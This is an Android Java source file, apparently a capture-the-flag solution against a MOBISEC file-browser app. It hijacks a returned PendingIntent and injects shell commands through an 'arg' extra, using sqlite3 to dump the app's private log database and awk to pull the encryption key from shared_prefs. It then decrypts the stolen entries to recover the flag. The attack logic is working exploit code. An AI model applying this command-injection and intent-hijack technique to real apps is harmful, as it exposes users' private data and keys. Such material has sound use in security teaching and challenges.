package com.example.filebrowser;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.IntentSender;
import android.os.Bundle;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.math.BigInteger;
import java.nio.charset.Charset;
import java.security.Key;
import java.security.MessageDigest;
import java.util.Iterator;
import java.util.Locale;
import java.util.Random;
import java.util.Set;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;




public class MainActivity extends AppCompatActivity {

    public static final String upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    public static final String lower = upper.toLowerCase(Locale.ROOT);
    public static final String digits = "0123456789";
    public static final String alphanum = upper + lower + digits;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ActivityResultLauncher<Intent> aActivityResultLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    if (result.getResultCode() == Activity.RESULT_OK) {
                        Log.i("MOBISEC", "Obtaining result");
                        try {
                            Intent data = result.getData();
                            PendingIntent pi = data.getParcelableExtra("pi");
                            Intent repl = new Intent();
                            repl.putExtra("oper","ls");
                            repl.putExtra("arg"," ; sqlite3 /data/data/com.mobisec.filebrowser/databases/LogDb \"SELECT * FROM log;\" > /sdcard/aux.log");
                            repl.putExtra("debug", true);
                            pi.send(this, 1, repl, null, null);
                            try {
                                Log.e("MOBISEC", "Sleeping...");
                                Thread.sleep(5000);
                            } catch (Exception e) {
                                Log.e("MOBISEC", e.toString());
                            }
                            readFile("/sdcard/browser.log");
                            String cont = readFile("/sdcard/aux.log");
                            String[] contRes = cont.split("\\|");

                            Intent repl2 = new Intent();
                            repl2.putExtra("oper","ls");
                            repl2.putExtra("arg"," ; awk -F'[<>]' '/<string name=\"key\">/{print $3}' /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml > /sdcard/aux2.log");
                            repl2.putExtra("debug", true);
                            pi.send(this, 1, repl2, null, null);
                            try {
                                Log.e("MOBISEC", "Sleeping...");
                                Thread.sleep(5000);
                            } catch (Exception e) {
                                Log.e("MOBISEC", e.toString());
                            }
                            String key = readFile("/sdcard/aux2.log");
                            String[] keyArr = key.split("\\|");
                            for(String s: contRes){
                                Log.e("MOBISEC", s);
                                if(s.length()>1){
                                    Log.e("MOBISEC", "Checking...");
                                    Log.e("MOBISEC", keyArr[0]);
                                    byte [] keyB = hash(keyArr[0].getBytes());
                                    Log.e("MOBISEC", "NOT IN KEY");
                                    byte [] contents = hex2bin(s);
                                    Log.e("MOBISEC", "NOT IN CONTENTS");
                                    Log.i("MOBISEC", "" + new String(decrypt(contents, keyB)));
                                }
                            }

                            /*
                            ActivityResultLauncher<PendingIntent> bActivityResultLauncher = registerForActivityResult(
                                    new ActivityResultContracts.StartActivityForResult(),
                                    result2 -> {
                                        if (result2.getResultCode() == Activity.RESULT_OK) {
                                            Log.i("MOBISEC", "Obtaining result 2");
                                            try {
                                                Bundle bund = result2.getData().getExtras();
                                                String res = bund.getString("result");
                                                Log.i("MOBISEC", res);
                                            }catch(Exception e){
                                                Log.i("MOBISEC", e.toString());
                                            }
                                        }
                                    });
                            try{
                                bActivityResultLauncher.launch(pi);
                            }catch(Exception e){
                                Log.i("MOBISEC", "Error launching the pending Intent: " + e.toString());
                            }
*/
                        }catch(Exception e){
                            Log.i("MOBISEC", e.toString());
                        }
                    }
                });

        Intent intentA = new Intent("com.mobisec.browser.action.START_PLUGIN");
        intentA.setClassName("com.mobisec.filebrowser", "com.mobisec.filebrowser.PluginActivity");
        aActivityResultLauncher.launch(intentA);
    }

    public String readFile(String route){
        File logFile = new File(route);
        try {
            // Read the file contents
            StringBuilder fileContents = new StringBuilder();
            BufferedReader reader = new BufferedReader(new FileReader(logFile));

            String line;
            while ((line = reader.readLine()) != null) {
                fileContents.append(line).append("|");
            }
            reader.close();
            // Print the file contents
            Log.i("MOBISEC", "File contents: " + fileContents);
            return "" + fileContents;
        } catch (Exception e) {
            Log.e("MOBISEC", "Error reading the file: " + e.getMessage());
        }
        return "NOTHING NOTHING";
    }
/*
    public void onReceive(Intent intent){
        Log.i("MOBISEC", "Something received");
        try {
            Bundle bund = intent.getExtras();
            Log.i("MOBISEC", "Contents extracted");
            String res = bund.getString("result");
            Log.i("MOBISEC", res);
        }catch(Exception e){
            Log.i("MOBISEC", e.toString());
        }
    }
*/
    private void generateKey() {
        String key = getRandomString(20);
        SharedPreferences.Editor editor = getSharedPreferences("keys", 0).edit();
        editor.putString("key", key);
        editor.commit();
    }

    private static String getKey(Context ctx) throws Exception {
        SharedPreferences prefs = ctx.getSharedPreferences("keys", 0);
        String key = prefs.getString("key", null);
        if (key == null) {
            throw new Exception("key not found");
        }
        return key;
    }

    private static byte[] getAesKey(Context ctx) throws Exception {
        String key = getKey(ctx);
        return hash(key.getBytes());
    }

    public void startQuery(String oper, String arg) {
        Intent i = new Intent(this, QueryActivity.class);
        i.putExtra("oper", oper);
        i.putExtra("arg", arg);
        startActivityForResult(i, 400);
    }

    public static void logQuery(Context ctx, String oper, String arg) {
        try {
            byte[] aesKey = getAesKey(ctx);
            String encOper = bin2hex(encrypt(oper.getBytes(), aesKey));
            String encValue = bin2hex(encrypt(arg.getBytes(), aesKey));
            rawLogQuery(ctx, encOper, encValue);
        } catch (Exception e) {
        }
    }

    public static Uri rawLogQuery(Context ctx, String oper, String arg) {
        ContentValues values = new ContentValues();
        values.put("oper", oper);
        values.put("arg", arg);
        Uri uri = ctx.getContentResolver().insert(LogProvider.CONTENT_URI, values);
        return uri;
    }

    public static boolean writeToFile(String fp, String data) {
        try {
            FileOutputStream fos = new FileOutputStream(fp);
            fos.write(data.getBytes(Charset.defaultCharset()));
            fos.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void setFlag(Intent intent) {
        String flag = null;
        if (intent != null) {
            flag = intent.getStringExtra("flag");
        }
        if (flag == null) {
            flag = "dummyflag";
        }
        logQuery(this, "genflag", flag);
        Log.e("MOBISEC", "flag set correctly");
    }

    /* JADX INFO: Access modifiers changed from: private */
    @SuppressLint("Range")
    public String getFlag() throws Exception {
        byte[] aesKey = getAesKey(this);
        String encOper = bin2hex(encrypt("genflag".getBytes(), aesKey));
        Uri infoEntries = Uri.parse("content://com.mobisec.provider.Log/log");
        Cursor c = getContentResolver().query(infoEntries, null, null, null, "oper");
        if (c.moveToFirst()) {
            do {
                c.getString(c.getColumnIndex("id"));
                String oper = c.getString(c.getColumnIndex("oper"));
                String arg = c.getString(c.getColumnIndex("arg"));
                if (oper.equals(encOper)) {
                    return new String(decrypt(hex2bin(arg), aesKey));
                }
            } while (c.moveToNext());
            return null;
        }
        return null;
    }

    public static byte[] encrypt(byte[] in, byte[] key) throws Exception {
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(1, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(in);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        byte[] out = outputStream.toByteArray();
        return out;
    }

    public static byte[] decrypt(byte[] ct, byte[] key) throws Exception {
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(2, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(ct);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        byte[] out = outputStream.toByteArray();
        return out;
    }

    public static byte[] hash(byte[] in) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(in);
        return md.digest();
    }

    public static String getRandomString(int len) {
        Random generator = new Random();
        StringBuilder randomStringBuilder = new StringBuilder();
        for (int i = 0; i < len; i++) {
            String str = alphanum;
            char tempChar = str.charAt(generator.nextInt(str.length()));
            randomStringBuilder.append(tempChar);
        }
        return randomStringBuilder.toString();
    }

    static String bin2hex(byte[] data) {
        return String.format("%0" + (data.length * 2) + 'x', new BigInteger(1, data));
    }

    public static byte[] hex2bin(String hex) throws NumberFormatException {
        byte[] val = new byte[hex.length() / 2];
        for (int i = 0; i < val.length; i++) {
            int index = i * 2;
            int j = Integer.parseInt(hex.substring(index, index + 2), 16);
            val[i] = (byte) j;
        }
        return val;
    }


    private static int digit(char ch) {
        int r = Character.digit(ch, 16);
        if (r < 0) {
            throw new NumberFormatException("Invalid hexadecimal string: " + ch);
        }
        return r;
    }
}